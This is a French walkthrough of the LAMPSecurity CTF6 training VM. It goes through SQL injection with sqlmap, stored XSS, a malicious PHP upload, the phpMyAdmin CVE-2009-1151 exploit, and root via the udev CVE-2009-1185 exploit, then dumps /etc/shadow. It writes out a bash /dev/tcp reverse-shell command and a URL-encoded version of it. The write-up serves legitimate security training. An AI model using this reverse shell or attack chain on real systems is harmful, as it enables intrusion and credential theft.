---
description: 'Walkthrough de la machine LAMPSecurity: CTF6'
---

# LAMPSecurity: CTF6

## Détails de la machine

**Nom :** LAMPSecurity: CTF6  
**Date de sortie :** 29 Juin 2009  
**Lien de téléchargement :** [http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/CTF6/lampsecurity\_ctf6.zip/download](http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/CTF6/lampsecurity_ctf6.zip/download)  
**Niveau :** Facile  
**Objectif\(s\) :** obtenir un "root"  
**Description :**`The LAMPSecurity project is an effort to produce training and benchmarking tools that can be used to educate information security professionals and test products. Please note there are other capture the flag exercises (not just the latest one). Check the SourceForge site to find other exercises available (http://sourceforge.net/projects/lampsecurity/files/CaptureTheFlag/).  
These exercises can be used for training purposes by following this documentation. Alternatively you may wish to test new tools, using the CTF virtual machines as targets. This is especially helpful in evaluating the effectiveness of vulnerability discovery or penetration testing tools.`

## Reconnaissance

Votre cible, si vous l'acceptez sera désignée par `netdiscovery` :

![](../../../.gitbook/assets/01b81fb29800416a48b95b8bf4067734.png)

On scanne les services de la belle, comme d'habitude avec `nmap` :

![](../../../.gitbook/assets/0d2df19ee103a6d59c16b63c2414b097.png)

Rien de très particulier ici, du SSH, un serveur web, un service MySQL sur le port 3306. A noter tout de même un serveur web sur le port 443.

### Serveur HTTP \(port 80\)

Tout en commençant la reconnaissance manuelle on peut tout de suite lancer un `nikto` dont voici les résultats :

![](../../../.gitbook/assets/5bb8c42e703fa254522f24bf8e9ef5f2.png)

Plusieurs URLs intéressants à ne pas oublier de visiter après notre petite reconnaissance :

* /files
* /lib
* /mail
* /phpmyadmin
* /sql

La page d'accueil du serveur HTTP présente la page d'un revendeur de widgets. On remarque bien évidemment les quelques messages postés par l'utilisateur "admin", un lien vers un webmail, des informations sur les technologies utilisées \(PHP, MySQL, CenOS\) et pour terminer des noms/prénoms du staff :

![](../../../.gitbook/assets/77b6af492db3c6a94a786f674f5a3463.png)

Ni une ni deux, l'injection SQL présente au niveau du paramètre "id" permettant d'identifier un billet :

![](../../../.gitbook/assets/f92bbcc2d2a54032c51cad3570a710b7.png)

Les différentes URLs sont intéressantes mais sans doute facultatives : on y retrouve un script SQL qui permet de connaitre des informations sur la base de données \(mais bon on va pas se mentir `sqlmap` en aura pas besoin\), un répertoire d'images, le phpMyAdmin ou encore le client mail.

#### phpMyAdmin

Le phpMyAdmin disponible sur le serveur est une version 3.0.0. Il est possible de savoir cela en allant vérifier l'URL http://192.168.1.29/phpmyadmin/README. Cette version est vulnérable à une RCE :

![](../../../.gitbook/assets/906bd4b1971cd3b24146d53e51a32111.png)

### Serveur HTTP \(port 443\)

Il s'agit en fait du même si que celui présent sur le port 80, déçu 😞 .

## Exploitation

### Injection SQL

Ici on ne s'embête pas, `sqlmap` à la rescousse. Il y a deux bases intéressantes, la base "cms" qui correspond au site web, ainsi que la base "roundcube" qui correspond au webmail :

![](../../../.gitbook/assets/e03d1b4b831468edb37511112361e8de.png)

Pas de mot de passe de disponible dans la table "users" de la base de données "roundcube", mais on récupère à la place le mot de passe de mysql :

![](../../../.gitbook/assets/84c1dc7adcaefe8bfcfcdfa9d6102cb6.png)

### Injection de code

On s'authentifie grâce à notre compte fraîchement récupéré, puis nous voyons qu'il est possible d'ajouter un événement via le bouton "Add Event". Sans le moindre effort apparaît déjà deux XSS stockées grâce au champ "Titre" et "Description" :

{% hint style="warning" %}
`Ma machine ayant plantée à ce moment dû à un effet kiss kool ayant une origine inconnue, l'IP de la victime devient maintenant 192.168.1.30`
{% endhint %}

On continue avec l'option de joindre un fichier avec l’événement \(ici qui contient un script PHP appelant la méthode `phpinfo()`\) :

![](../../../.gitbook/assets/894c71013775256a8a0b8b4b83816b80.png)

Il suffit ensuite d'aller directement sur le lien de l'image et :

![](../../../.gitbook/assets/59c2f02d7b413d2a39e0aba08583bc3d.png)

Vous désirez bien un peu de `msfvenom` ensuite ?

![](../../../.gitbook/assets/29b9c5598bb7347964faa9cde9fe5d6b.png)

Nous voici dans la place avec notre shell limité :

![](../../../.gitbook/assets/7658ea9a3c18402e3e64b74f31c045b5.png)

### PhpMyAdmin \(CVE-2009-1151\)

Etant donné que nous avions déjà identifié l'injection de code au niveau du phpMyAdmin, je me suis amusé à l'exploiter également. Il suffit tout d'abord d'exécuter l'exploit "8921.sh" disponible, puis de renseigner l'URL suivante avec la commande désirée :

![](../../../.gitbook/assets/5a42613d2a939a338918aa8fd4338fc7.png)

J'ai légèrement galéré pour récupérer un shell propre, car netcat ne semblait pas passer. J'ai alors utilisé `bash` avec la commande suivante : `bash -i >& /dev/tcp/adresse_ip/port 0<&1` :

Pour cela que cela fonctionne via le navigateur j'ai tout d'abord encodé le tout en encodage URL soit :  
c=%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%31%30%33%2f%35%35%35%35%20%30%3e%26%31 :

![](../../../.gitbook/assets/b72bd4009a7cff516bf1eb8721e34099.png)

Côté Kali un simple `netcat` en écoute et lors de l'exécution de l'exploit :

![](../../../.gitbook/assets/9b54071bf95d65cd25cf302301f3610d.png)

## Élévation de privilèges

On récupère la version du noyau afin de voir s'il est possible de l'exploiter :

![](../../../.gitbook/assets/ae79dd5de8576224129892d479c3555d.png)

Bonne nouvelle, une recherche sous Google nous indique que la version 2.6 de Linux est vulnérable à la CVE-2009-1185. Il s'agit en fait d'une vulnérabilité du gestionnaire de périphériques udev qui accepte des messages NETLINK de la part des utilisateurs locaux alors qu'il ne devrait les accepter seulement s'ils proviennent de l'espace noyau. On récupère donc l'exploit \([https://www.exploit-db.com/exploits/8478](https://www.exploit-db.com/exploits/8478)\) puis on l'exécute :

![](../../../.gitbook/assets/770fdc869b87171154e9bb6fa46196f1.png)

Nous sommes "root", travail terminé

## Conclusion

Cette machine suit les mêmes règles que ces petites sœurs, et cela nous va très bien. Rien de très difficile à part l'exploit qui est un peu capricieux. Une fois "root" j'ai récupéré le fichier "/etc/shadow" afin de voir si certains mots de passe étaient guessable ou bruteforcable par exemple \(dans le cas où on serait passé à côté de la faille web\) :

![](../../../.gitbook/assets/81f6ff36c457303f43ed188bb1ee9946.png)

Certains comptes étaient donc bruteforcables car les mots de passe étaient présents dans le dictionnaire "rockyou.txt".



